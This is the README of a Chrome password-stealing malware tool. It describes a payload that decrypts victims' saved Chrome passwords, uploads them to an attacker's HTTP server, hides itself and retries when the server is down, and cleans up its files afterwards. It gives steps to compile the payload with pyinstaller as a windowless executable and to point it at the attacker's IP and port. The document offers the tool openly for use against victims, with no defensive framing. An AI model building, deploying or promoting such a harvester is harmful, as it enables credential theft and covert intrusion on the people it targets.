# Chrome-Password-Harvester
A Google Chrome password harvester. Steals google chrome passwords and uploads them to remote server whilst cleaning up all the files.

## How it works
This consists of two files, the payload and server. The python server is a simple http.server which simply saves any file recieved via POST request with the name given. This allows for multiple victims to upload their files and keep them seperate. The payload itself decrypts the google chrome passwords, attempts to upload the harvested information to the server and cleans up at the end. In the case that the server is not life and the information cannot be uploaded, the payload will hide it self whilst still attempting a connection every two seconds and once the file is successfully uploaded, clean up as before.

## Installation

Install requirements
```
pip install -r requirements.txt
```

To compile the payload install pyinstaller
```
pip install pyinstaller
```

Compile the payload
```
pyinstaller --onefile --noconsole {ChromePasswordHarvester.py}
```

## Usage
Ensure to change {IP} and {PORT} within the payload before compiling to match the IP and port of the server.

Python server
```
python server.py
```
